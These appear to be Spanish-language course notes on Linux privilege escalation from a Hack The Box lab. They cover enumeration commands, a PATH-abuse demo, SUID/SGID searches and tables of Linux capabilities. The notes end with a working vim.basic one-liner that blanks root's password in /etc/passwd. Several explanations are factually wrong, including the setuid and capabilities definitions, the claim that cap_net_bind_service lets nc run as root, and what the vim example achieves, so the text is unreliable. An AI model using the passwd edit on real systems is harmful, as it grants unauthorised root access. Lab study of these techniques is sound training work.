# Linux Privilege Escalation

## Enumeration
- Generalmente vamos a empezar utilizando LinEnum, Linpeas, exploitSuggester, linux-exploit-suggester, etc.
- Hay varios puntos importantes a enumerar:
    - Version del OS
    - Version del Kernel
    - Servicios ejecutandose
- También podemos revisar `sudo -l` para ver que comandos podemos ejecutar con sudo.
- Podemos revisar los cronjobs `ls -la /etc/cron.daily/` y `ls -la /etc/cron.hourly/`
- Encontrar directorios con acceso a escritura: `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
- Encontrar archivos con acceso a escritura: `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
- Encontrar scripts: `find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"`
- Corriendo servicios como root: `ps aux | grep root`

## Path Abuse
- Definición: PATH es una variable de entorno que contiene una lista de directorios a los que el sistema busca ejecutables.
    - Ejemplo: cuando hacemos `cat /etc/passwd` el sistema busca el ejecutable `cat` en `/bin/cat` en los directorios especificados en la variable PATH.
- Podemos chequear el contenido de la variable PATH con `echo $PATH`
- Crear un script o programa especificado en el PATH lo hace ejecutable en cualquier lugar del sistema.
- Ejemplo de abuso:
```bash
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
htb_student@NIX02:~$ ls
PATH ABUSE!!
```

### Setuid permissions
- Definición: Setuid permissions permite a un proceso ejecutar comandos como el usuario que lo ejecuta. **Set User ID upon Execution (setuid)**
- El setuid bit aparece como una `s` en el lugar del bit de ejecución en el owner.
- `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
### Setgid permissions
- Definición: Setgid permissions permite a un proceso ejecutar comandos como el grupo que lo ejecuta.
- `find / -uid 0 -perm -6000 -type f 2>/dev/null`

## Capabilities
- Definición: Capabilities permiten a un proceso ejecutar comandos como el usuario que lo ejecuta.
- Generalmente se usan para ejecutar ciertos comandos como root.
- setcap definición: setea capabilities para un programa.
    - ejemplo: podemos usar `cap_net_bind_service` para poder ejecutar el comando `nc -l -p 80` como root.
    - `sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic`
- `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`: este comando hace un chequeo de los binarios que tienen capabilities.

| Capacidad              | Descripción                                                                                              |
|------------------------|----------------------------------------------------------------------------------------------------------|
| `cap_sys_admin`        | Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema. |
| `cap_sys_chroot`       | Permite cambiar el directorio raíz para el proceso actual, permitiéndole acceder a archivos y directorios que de otro modo serían inaccesibles. |
| `cap_sys_ptrace`       | Permite adjuntar y depurar otros procesos, potencialmente permitiendo acceder a información sensible o modificar el comportamiento de otros procesos. |
| `cap_sys_nice`         | Permite aumentar o disminuir la prioridad de los procesos, potencialmente permitiendo acceder a recursos que de otro modo estarían restringidos. |
| `cap_sys_time`         | Permite modificar el reloj del sistema, potencialmente permitiendo manipular marcas de tiempo o causar que otros procesos se comporten de manera inesperada. |
| `cap_sys_resource`     | Permite modificar los límites de recursos del sistema, como el número máximo de descriptores de archivos abiertos o la cantidad máxima de memoria que se puede asignar. |
| `cap_sys_module`       | Permite cargar y descargar módulos del kernel, potencialmente permitiendo modificar el comportamiento del sistema operativo o acceder a información sensible. |
| `cap_net_bind_service` | Permite enlazar a puertos de red, potencialmente permitiendo acceder a información sensible o realizar acciones no autorizadas. |


| Valor de Capacidad | Descripción                                                                                                      |
|--------------------|------------------------------------------------------------------------------------------------------------------|
| `=`                | Este valor establece la capacidad especificada para el ejecutable, pero no otorga ningún privilegio. Esto puede ser útil si queremos borrar una capacidad previamente establecida para el ejecutable. |
| `+ep`              | Este valor otorga los privilegios efectivos y permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite, pero no le permite realizar acciones que no estén permitidas por la capacidad. |
| `+ei`              | Este valor otorga privilegios suficientes y heredables para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite y que los procesos hijos generados por el ejecutable hereden la capacidad y realicen las mismas acciones. |
| `+p`               | Este valor otorga los privilegios permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite, pero no le permite realizar acciones que no estén permitidas por la capacidad. Esto puede ser útil si queremos otorgar la capacidad al ejecutable pero evitar que herede la capacidad o que los procesos hijos la hereden. |

| Capacidad          | Descripción                                                                                                      |
|--------------------|------------------------------------------------------------------------------------------------------------------|
| `cap_setuid`       | Permite a un proceso establecer su ID de usuario efectivo, lo que puede usarse para obtener los privilegios de otro usuario, incluido el usuario root. |
| `cap_setgid`       | Permite establecer su ID de grupo efectivo, lo que puede usarse para obtener los privilegios de otro grupo, incluido el grupo root. |
| `cap_sys_admin`    | Esta capacidad proporciona una amplia gama de privilegios administrativos, incluyendo la capacidad de realizar muchas acciones reservadas para el usuario root, como modificar configuraciones del sistema y montar y desmontar sistemas de archivos. |
| `cap_dac_override` | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos. |

### Enumerar capabilities
- `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`: este comando hace un chequeo de los binarios que tienen capabilities.
### Explotando capabilities
- Ejemplo: `/usr/bin/vim.basic /etc/passwd`
    - `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`
    - En este caso el binario vim.basic tiene la capacidad `cap_setuid` y `cap_setgid` por lo que podemos ejecutar el comando `id` como root..